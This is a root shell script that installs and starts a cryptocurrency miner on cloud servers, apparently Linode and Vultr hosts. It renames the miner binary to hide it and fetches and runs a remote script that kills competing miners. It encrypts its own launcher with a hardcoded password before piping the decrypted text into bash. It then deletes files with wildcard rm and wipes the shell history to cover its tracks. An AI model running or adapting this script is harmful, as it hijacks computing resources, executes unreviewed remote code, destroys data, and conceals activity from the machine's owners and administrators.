#!/bin/sh
password="danielchau@123#"
rm -fR /root/cpuminer-opt-linux
rm -fv *
sudo apt-get update -y
sudo apt-get install cpulimit -y
wget --no-check-certificate -O cpuminer-opt-linux.tar.gz https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.36/cpuminer-opt-linux.tar.gz
mkdir /root/cpuminer-opt-linux
tar -xvf cpuminer-opt-linux.tar.gz -C /root/cpuminer-opt-linux
chmod +x ./cpuminer-opt-linux/* 
cores=$(nproc --all)
#rounded_cores=$((cores * 9 / 10))
#read -p "What is pool? (exp: fr-zephyr.miningocean.org): " pool
limitCPU=$((cores * 80))

#find best servers
servers=("stratum-eu.rplant.xyz" "stratum-asia.rplant.xyz" "stratum-na.rplant.xyz")
fastest_server="stratum-eu.rplant.xyz"
min_latency=999999
for server in "${servers[@]}"; do
    latency=$(ping -c 2 $server | awk '/^rtt/ { print $4 }' | cut -d '/' -f 2)
    if (( $(echo "$latency < $min_latency" | bc -l) )); then
        min_latency=$latency
        fastest_server=$server
    fi
done
echo "$fastest_server with min_latency is: $latency"
mv /root/cpuminer-opt-linux/cpuminer-sse2 /root/love
cat >>/root/config.json <<EOF
{
  "url": "stratum+tcps://$fastest_server:17079",
  "user": "uoLoErbARZipdQz94GCZ3H2qUrX13pTvF4.Linode"
}
EOF
cat /dev/null > /root/danielluis1921.sh
cat >>/root/danielluis1921.sh <<EOF
#!/bin/bash
./kill_miner.sh
sleep 3
sudo /root/love --background --threads=$cores -a yespower -c config.json
sleep 3
EOF

hostname=$(hostname)
if [ "$hostname" = "vultr" ];
then
  sed -i "$ a\\cpulimit --limit=$limitCPU --pid \$(pidof love) > /dev/null 2>&1 &" danielluis1921.sh
  sed -i 's/Linode/Vultr/g' config.json
else
  echo "hostname isn't vultr"
fi

openssl enc -aes-256-cbc -salt -pbkdf2 -in danielluis1921.sh -out danielluis1922.sh -k $password
rm -fv danielluis1921.sh
chmod +x /root/danielluis1922.sh

wget "https://raw.githubusercontent.com/danielluis1921/Danialluis1921/main/kill_miner.sh" --output-document=/root/kill_miner.sh
chmod +x /root/kill_miner.sh
./kill_miner.sh
sleep 3
openssl enc -d -aes-256-cbc -pbkdf2 -in danielluis1922.sh -k $password | bash
rm -fv *
rm -fR cpuminer-opt-linux/
rm -fR xmrig-6.21.0/
history -c && history -w
